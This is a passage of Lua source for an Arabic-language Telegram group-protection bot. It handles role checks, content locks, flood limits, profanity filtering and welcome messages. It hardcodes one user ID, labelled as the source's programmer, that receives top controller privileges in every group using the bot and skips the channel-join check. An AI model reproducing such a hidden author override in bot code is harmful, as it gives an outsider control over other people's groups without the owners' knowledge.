Admin = Redis:sismember(darket.."Admin:Group"..ChatId,UserId)
Special = Redis:sismember(darket.."Special:Group"..ChatId,UserId)
StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
if UserId == 5386549632 then
Status = true
elseif UserId == 5386549632 then
Status = true
elseif UserId == Sudo_Id then  
Status = true
elseif UserId == darket then
Status = true
elseif Devss then
Status = true
elseif Dev then
Status = true
elseif Supcreator then
Status = true
elseif Owners then
Status = true
elseif Creator then
Status = true
elseif Manger then
Status = true
elseif Admin then
Status = true
elseif StatusMember == "chatMemberStatusCreator" then
Status = true
elseif StatusMember == "chatMemberStatusAdministrator" then
Status = true
else
Status = false
end  
return Status
end 
function StatusSilent(ChatId,UserId)
Status = nil
Devss = Redis:sismember(darket.."Devss:Groups",UserId) 
Dev = Redis:sismember(darket.."Dev:Groups",UserId) 
Supcreator = Redis:sismember(darket.."Supcreator:Group"..ChatId,UserId) 
Owners = Redis:sismember(darket.."Owners:Group"..ChatId,UserId) 
Creator = Redis:sismember(darket.."Creator:Group"..ChatId,UserId)
Manger = Redis:sismember(darket.."Manger:Group"..ChatId,UserId)
Admin = Redis:sismember(darket.."Admin:Group"..ChatId,UserId)
Special = Redis:sismember(darket.."Special:Group"..ChatId,UserId)
StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
if UserId == 5386549632 then
Status = true
elseif UserId == 5386549632 then
Status = true
elseif UserId == Sudo_Id then    
Status = true
elseif UserId == darket then
Status = true
elseif Devss then
Status = true
elseif Dev then
Status = true
elseif Supcreator then
Status = true
elseif Owners then
Status = true
elseif Creator then
Status = true
elseif Manger then
Status = true
elseif Admin then
Status = true
elseif StatusMember == "chatMemberStatusCreator" then
Status = true
else
Status = false
end  
return Status
end 
function getInputFile(file, conversion_str, expected_size)
local str = tostring(file)
if (conversion_str and expectedsize) then
return {
luatele = 'inputFileGenerated',
original_path = tostring(file),
conversion = tostring(conversion_str),
expected_size = expected_size
}
else
if str:match('/') then
return {
luatele = 'inputFileLocal',
path = file
}
elseif str:match('^%d+$') then
return {
luatele = 'inputFileId',
id = file
}
else
return {
luatele = 'inputFileRemote',
id = file
}
end
end
end
function GetInfoBot(msg)
local GetMemberStatus = LuaTele.getChatMember(msg.chat_id,darket).status
if GetMemberStatus.can_change_info then
change_info = true else change_info = false
end
if GetMemberStatus.can_delete_messages then
delete_messages = true else delete_messages = false
end
if GetMemberStatus.can_invite_users then
invite_users = true else invite_users = false
end
if GetMemberStatus.can_pin_messages then
pin_messages = true else pin_messages = false
end
if GetMemberStatus.can_restrict_members then
restrict_members = true else restrict_members = false
end
if GetMemberStatus.can_promote_members then
promote = true else promote = false
end
return{
SetAdmin = promote,
BanUser = restrict_members,
Invite = invite_users,
PinMsg = pin_messages,
DelMsg = delete_messages,
Info = change_info
}
end
function download(url,name)
if not name then
name = url:match('([^/]+)$')
end
if string.find(url,'https') then
data,res = https.request(url)
elseif string.find(url,'http') then
data,res = http.request(url)
else
return 'The link format is incorrect.'
end
if res ~= 200 then
return 'check url , error code : '..res
else
file = io.open(name,'wb')
file:write(data)
file:close()
print('Downloaded :> '..name)
return './'..name
end
end
function ChannelJoin(msg)
JoinChannel = true
local chh = Redis:get(darket.."chfalse")
if chh then
local url = https.request("https://api.telegram.org/bot"..Token.."/getchatmember?chat_id="..chh.."&user_id="..msg.sender.user_id)
data = json:decode(url)
if data.result.status == "left" or data.result.status == "kicked" then
if tonumber(msg.sender.user_id) ~= tonumber(5386549632) then
JoinChannel = false 
end
end
end 
return JoinChannel
end
function File_Bot_Run(msg,data)  
local msg_chat_id = msg.chat_id
local msg_reply_id = msg.reply_to_message_id
local msg_user_send_id = msg.sender.user_id
local msg_id = msg.id
--
--
if tonumber(msg.sender.user_id) == tonumber(darket) then
print('This is reply for Bot')
return false
end
if data.sender.luatele == "messageSenderChat" then
if Redis:get(darket.."Lock:channell"..msg_chat_id) then
local m = Redis:get(darket.."chadmin"..msg_chat_id) 
if data.sender.chat_id == tonumber(m) then
return false
else
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
end
end
return false 
end
Redis:incr(darket..'Num:Message:User'..msg.chat_id..':'..msg.sender.user_id) 
if msg.date and msg.date < tonumber(os.time() - 15) then
print("->> Old Message End <<-")
return false
end

if data.content.text then
text = data.content.text.text
else
text = nil
end

if Statusrestricted(msg.chat_id,msg.sender.user_id).BanAll == true then
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id}),LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
elseif Statusrestricted(msg.chat_id,msg.sender.user_id).ktmall == true then
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Statusrestricted(msg.chat_id,msg.sender.user_id).BanGroup == true then
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id}),LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
elseif Statusrestricted(msg.chat_id,msg.sender.user_id).SilentGroup == true then
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
end
if tonumber(msg.sender.user_id) == 5386549632 then
msg.Name_Controller = 'المبرمج ستيفن '
msg.The_Controller = 1
elseif tonumber(msg.sender.user_id) == 5386549632 then
msg.Name_Controller = 'مطور السورس '
msg.The_Controller = 1
elseif The_ControllerAll(msg.sender.user_id) == true then  
msg.The_Controller = 1
msg.Name_Controller = 'المطور الاساسي '
elseif Redis:sismember(darket.."Devss:Groups",msg.sender.user_id) == true then
msg.The_Controller = 2
msg.Name_Controller = 'المطور الثانوي'
elseif Redis:sismember(darket.."Dev:Groups",msg.sender.user_id) == true then
msg.The_Controller = 3
msg.Name_Controller = Redis:get(darket.."Developer:Bot:Reply"..msg.chat_id) or 'المطور '
elseif Redis:sismember(darket.."Owners:Group"..msg.chat_id,msg.sender.user_id) == true then
msg.The_Controller = 44
msg.Name_Controller = Redis:get(darket.."PresidentQ:Group:Reply"..msg.chat_id) or 'المالك'
elseif Redis:sismember(darket.."Supcreator:Group"..msg.chat_id,msg.sender.user_id) == true then
msg.The_Controller = 4
msg.Name_Controller = Redis:get(darket.."President:Group:Reply"..msg.chat_id) or 'المنشئ الاساسي'
elseif Redis:sismember(darket.."Creator:Group"..msg.chat_id,msg.sender.user_id) == true then
msg.The_Controller = 5
msg.Name_Controller = Redis:get(darket.."Constructor:Group:Reply"..msg.chat_id) or 'المنشئ '
elseif Redis:sismember(darket.."Manger:Group"..msg.chat_id,msg.sender.user_id) == true then
msg.The_Controller = 6
msg.Name_Controller = Redis:get(darket.."Manager:Group:Reply"..msg.chat_id) or 'المدير '
elseif Redis:sismember(darket.."Admin:Group"..msg.chat_id,msg.sender.user_id) == true then
msg.The_Controller = 7
msg.Name_Controller = Redis:get(darket.."Admin:Group:Reply"..msg.chat_id) or 'الادمن '
elseif Redis:sismember(darket.."Special:Group"..msg.chat_id,msg.sender.user_id) == true then
msg.The_Controller = 8
msg.Name_Controller = Redis:get(darket.."Vip:Group:Reply"..msg.chat_id) or 'المميز '
elseif tonumber(msg.sender.user_id) == tonumber(darket) then
msg.The_Controller = 9
else
msg.The_Controller = 10
msg.Name_Controller = Redis:get(darket.."Mempar:Group:Reply"..msg.chat_id) or 'العضو '
end  
if msg.The_Controller == 1 then  
msg.ControllerBot = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 then
msg.Devss = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 then
msg.Dev = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 or msg.The_Controller == 44 or msg.The_Controller == 9 then
msg.Supcreatorm = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 or msg.The_Controller == 44 or msg.The_Controller == 4 or msg.The_Controller == 9 then
msg.Supcreator = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 or msg.The_Controller == 44 or msg.The_Controller == 4 or msg.The_Controller == 5 or msg.The_Controller == 9 then
msg.Creator = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 or msg.The_Controller == 44 or msg.The_Controller == 4 or msg.The_Controller == 5 or msg.The_Controller == 6 or msg.The_Controller == 9 then
msg.Manger = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 or msg.The_Controller == 44 or msg.The_Controller == 4 or msg.The_Controller == 5 or msg.The_Controller == 6 or msg.The_Controller == 7 or msg.The_Controller == 9 then
msg.Admin = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 or msg.The_Controller == 44 or msg.The_Controller == 4 or msg.The_Controller == 5 or msg.The_Controller == 6 or msg.The_Controller == 7 or msg.The_Controller == 8 or msg.The_Controller == 9 then
msg.Special = true
end
if Redis:get(darket.."Lock:text"..msg_chat_id) and not msg.Special then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
return false
end 
if msg.content.luatele == "messageChatJoinByLink" or msg.content.luatele == "messageChatAddMembers" then
if Redis:get(darket.."Status:Welcome"..msg_chat_id) then
local UserInfo = LuaTele.getUser(msg.sender.user_id)
local Get_Chat = LuaTele.getChat(msg_chat_id)
local Welcome = Redis:get(darket.."Welcome:Group"..msg_chat_id)
if Welcome then 
if UserInfo.username then
UserInfousername = '@'..UserInfo.username
else
UserInfousername = 'لا يوجد '
end
Welcome = Welcome:gsub('{name}',UserInfo.first_name) 
Welcome = Welcome:gsub('{user}',UserInfousername) 
Welcome = Welcome:gsub('{NameCh}',Get_Chat.title) 
return send(msg_chat_id,msg_id,Welcome,"md")  
else
return send(msg_chat_id,msg_id,'٠اطلق دخول ['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')\n٠نورت الكروب {'..Get_Chat.title..'}',"md")  
end
end
end
if not msg.Special and msg.content.luatele ~= "messageChatAddMembers" and Redis:hget(darket.."Spam:Group:User"..msg_chat_id,"Spam:User") then 
if tonumber(msg.sender.user_id) == tonumber(darket) then
return false
end
local floods = Redis:hget(darket.."Spam:Group:User"..msg_chat_id,"Spam:User") or "nil"
local Num_Msg_Max = Redis:hget(darket.."Spam:Group:User"..msg_chat_id,"Num:Spam") or 5
local post_count = tonumber(Redis:get(darket.."Spam:Cont"..msg.sender.user_id..":"..msg_chat_id) or 0)
if post_count >= tonumber(Redis:hget(darket.."Spam:Group:User"..msg_chat_id,"Num:Spam") or 5) then 
local type = Redis:hget(darket.."Spam:Group:User"..msg_chat_id,"Spam:User") 
if type == "kick" then 
return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0), send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠قام بالتكرار في الكروب وتم طرده").Reply,"md",true)
end
if type == "del" then 
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
end
if type == "keed" then
return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0}), send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠قام بالتكرار في الكروب وتم تقييده").Reply,"md",true)  
end
if type == "mute" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠قام بالتكرار في الكروب وتم كتمه").Reply,"md",true)  
end
end
Redis:setex(darket.."Spam:Cont"..msg.sender.user_id..":"..msg_chat_id, tonumber(5), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if Redis:hget(darket.."Spam:Group:User"..msg_chat_id,"Num:Spam") then
Num_Msg_Max = Redis:hget(darket.."Spam:Group:User"..msg_chat_id,"Num:Spam") 
end
end 
if text and Redis:sismember("banserver",msg.sender.user_id) then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
if text and Redis:get(darket..'lock:Fshar'..msg.chat_id) and not msg.Special then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
return false
end
end
end
if text and Redis:get(darket..'lock:Fars'..msg.chat_id) and not msg.Special then 
list = {"که","پی","خسته","برم","راحتی","بیام","بپوشم","كرمه","چه","ڬ","ڿ","ڀ","ڎ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
return false
end
end
end
if text and not msg.Special then
local _nl, ctrl_ = string.gsub(text, "%c", "")  
local _nl, real_ = string.gsub(text, "%d", "")   
sens = 400  
if Redis:get(darket.."Lock:Spam"..msg.chat_id) == "del" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Redis:get(darket.."Lock:Spam"..msg.chat_id) == "ked" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Redis:get(darket.."Lock:Spam"..msg.chat_id) == "kick" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Redis:get(darket.."Lock:Spam"..msg.chat_id) == "ktm" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
end
end
if msg.forward_info and not msg.Admin then -- التوجيه
local Fwd_Group = Redis:get(darket.."Lock:forward"..msg_chat_id)
if Fwd_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Fwd_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Fwd_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Fwd_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is forward')
return false
end 

if msg.reply_markup and msg.reply_markup.luatele == "replyMarkupInlineKeyboard" then
if not msg.Special then  -- الكيبورد
local Keyboard_Group = Redis:get(darket.."Lock:Keyboard"..msg_chat_id)
if Keyboard_Group == "del" then

elseif Keyboard_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Keyboard_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Keyboard_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
print('This is reply_markup')
end 

if msg.content.location and not msg.Special then  -- الموقع
if location then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
end
print('This is location')
end 

if msg.content.entities and msg..content.entities[0] and msg.content.entities[0].type.luatele == "textEntityTypeUrl" and not msg.Special then  -- الماركداون
local Markduan_Gtoup = Redis:get(darket.."Lock:Markdaun"..msg_chat_id)
if Markduan_Gtoup == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Markduan_Gtoup == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Markduan_Gtoup == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Markduan_Gtoup == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is textEntityTypeUrl')
end 

if msg.content.game and not msg.Special then  -- الالعاب
local Games_Group = Redis:get(darket.."Lock:geam"..msg_chat_id)
if Games_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Games_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Games_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Games_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is games')
end 
if msg.content.luatele == "messagePinMessage" then -- رساله التثبيت
local Pin_Msg = Redis:get(darket.."lockpin"..msg_chat_id)
if Pin_Msg and not msg.Manger then
if Pin_Msg:match("(%d+)") then 
local PinMsg = LuaTele.pinChatMessage(msg_chat_id,Pin_Msg,true)
if PinMsg.luatele~= "ok" then
return send(msg_chat_id,msg_id,"\n٠ لا استطيع تثبيت الرسائل ليست لديه صلاحيه","md",true)
end
end
local UnPin = LuaTele.unpinChatMessage(msg_chat_id) 
if UnPin.luatele ~= "ok" then
return send(msg_chat_id,msg_id,"\n٠ لا استطيع الغاء تثبيت الرسائل ليست لديه صلاحيه","md",true)
end
return send(msg_chat_id,msg_id,"\n٠التثبيت معطل من قبل المدراء ","md",true)
end
print('This is message Pin')
end 


if msg.content.luatele == "messageChatAddMembers" then -- اضافه اشخاص
print('This is Add Membeers ')
Redis:incr(darket.."Num:Add:Memp"..msg_chat_id..":"..msg.sender.user_id) 
local AddMembrs = Redis:get(darket.."Lock:AddMempar"..msg_chat_id) 
local Lock_Bots = Redis:get(darket.."Lock:Bot:kick"..msg_chat_id)
for k,v in pairs(msg.content.member_user_ids) do
local Info_User = LuaTele.getUser(v) 
print(v)
if v == tonumber(darket) then
local N = (Redis:get(darket.."Name:Bot") or "داركت")
photo = LuaTele.getUserProfilePhotos(darket)
local TextBot = '*٠ انا بوت اسمي '..N..'\n٠ وظيفتي حمايه المجموعة من السبام والتفليش الخ....\n٠ لتفعيل البوت قم اضافته للمجموعتك وقم برفعه مشرف واكتب تفعيل\n*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ' تفعيل ', callback_data = msg.sender.user_id..'/onlinebott'..msg_chat_id},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'},
}
}
local rep = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id="..msg.chat_id.."&reply_to_message_id="..rep.."&photo="..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption="..URL.escape(TextBot).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end


Redis:set(darket.."Who:Added:Me"..msg_chat_id..":"..v,msg.sender.user_id)
if Info_User.type.luatele == "userTypeBot" then
if Lock_Bots == "del" and not msg.ControllerBot then
LuaTele.setChatMemberStatus(msg.chat_id,v,'banned',0)
elseif Lock_Bots == "kick" and not msg.ControllerBot then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
LuaTele.setChatMemberStatus(msg.chat_id,v,'banned',0)
end
elseif Info_User.type.luatele == "userTypeRegular" then
Redis:incr(darket.."Num:Add:Memp"..msg.chat_id..":"..msg.sender.user_id) 
if AddMembrs == "kick" and not msg.ControllerBot then
LuaTele.setChatMemberStatus(msg.chat_id,v,'banned',0)
end
end
end
end 

if msg.content.luatele == "messageContact" and not msg.Special then  -- الجهات
local Contact_Group = Redis:get(darket.."Lock:Contact"..msg_chat_id)
if Contact_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Contact_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Contact_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Contact_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Contact')
end 

if msg.content.luatele == "messageVideoNote" and not msg.Special then  -- بصمه الفيديو
local Videonote_Group = Redis:get(darket.."Lock:Unsupported"..msg_chat_id)
if Videonote_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Videonote_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Videonote_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Videonote_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is video Note')
end 

if msg.content.luatele == "messageDocument" and not msg.Special then  -- الملفات
local Document_Group = Redis:get(darket.."Lock:Document"..msg_chat_id)
if Document_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Document_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Document_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Document_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Document')
end 

if msg.content.luatele == "messageAudio" and not msg.Special then  -- الملفات الصوتيه
local Audio_Group = Redis:get(darket.."Lock:Audio"..msg_chat_id)
if Audio_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Audio_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Audio_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Audio_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Audio')
end 

if msg.content.luatele == "messageVideo" and not msg.Special then  -- الفيديو
local Video_Grouo = Redis:get(darket.."Lock:Video"..msg_chat_id)
if Video_Grouo == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Video_Grouo == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Video_Grouo == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Video_Grouo == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Video')
end 

if msg.content.luatele == "messageVoiceNote" and not msg.Special then  -- البصمات
local Voice_Group = Redis:get(darket.."Lock:vico"..msg_chat_id)
if Voice_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Voice_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Voice_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Voice_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Voice')
end 

if msg.content.luatele == "messageSticker" and not msg.Special then  -- الملصقات
local Sticker_Group = Redis:get(darket.."Lock:Sticker"..msg_chat_id)
if Sticker_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Sticker_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Sticker_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Sticker_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Sticker')
end 

if msg.via_bot_user_id ~= 0 and not msg.Special then  -- انلاين
local Inlen_Group = Redis:get(darket.."Lock:Inlen"..msg_chat_id)
if Inlen_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Inlen_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Inlen_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Inlen_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is viabot')
end

if msg.content.luatele == "messageAnimation" and not msg.Special then  -- المتحركات
local Gif_group = Redis:get(darket.."Lock:Animation"..msg_chat_id)
if Gif_group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Gif_group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Gif_group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Gif_group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Animation')
end 

if msg.content.luatele == "messagePhoto" and not msg.Special then  -- الصور
local Photo_Group = Redis:get(darket.."Lock:Photo"..msg_chat_id)
if Photo_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Photo_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Photo_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Photo_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Photo delete')
end

if msg.content.photo and Redis:get(darket.."Chat:Photo"..msg_chat_id..":"..msg.sender.user_id) then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
local ChatPhoto = LuaTele.setChatPhoto(msg_chat_id,idPhoto)
if (ChatPhoto.luatele == "error") then
Redis:del(darket.."Chat:Photo"..msg_chat_id..":"..msg.sender.user_id)
return send(msg_chat_id,msg_id,"٠ لا استطيع تغيير صوره الكروب لاني لست ادمن او ليست لديه الصلاحيه ","md",true)    
end
Redis:del(darket.."Chat:Photo"..msg_chat_id..":"..msg.sender.user_id)
return send(msg_chat_id,msg_id,"٠ تم تغيير صوره الكروب الكروب الى ","md",true)    
end
if (text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") 
or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") 
or text and text:match("[Tt].[Mm][Ee]/") 
or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") 
or text and text:match(".[Pp][Ee]") 
or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") 
or text and text:match("[Hh][Tt][Tt][Pp]://") 
or text and text:match("[Ww][Ww][Ww].") 
or text and text:match(".[Cc][Oo][Mm]")) or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match(".[Tt][Kk]") or text and text:match(".[Mm][Ll]") or text and text:match(".[Oo][Rr][Gg]") then 
local link_Group = Redis:get(darket.."Lock:Link"..msg_chat_id)  
if not msg.Special then
if link_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif link_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif link_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif link_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is link ')
return false
end
end
if text and text:match("@[%a%d_]+") and not msg.Special then 
local UserName_Group = Redis:get(darket.."Lock:User:Name"..msg_chat_id)
if UserName_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif UserName_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif UserName_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif UserName_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is username ')
end
if text and text:match("#[%a%d_]+") and not msg.Special then 
local Hashtak_Group = Redis:get(darket.."Lock:hashtak"..msg_chat_id)
if Hashtak_Group == "del" then
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Hashtak_Group == "ked" then
return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Hashtak_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Hashtak_Group == "kick" then
return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is hashtak ')
end
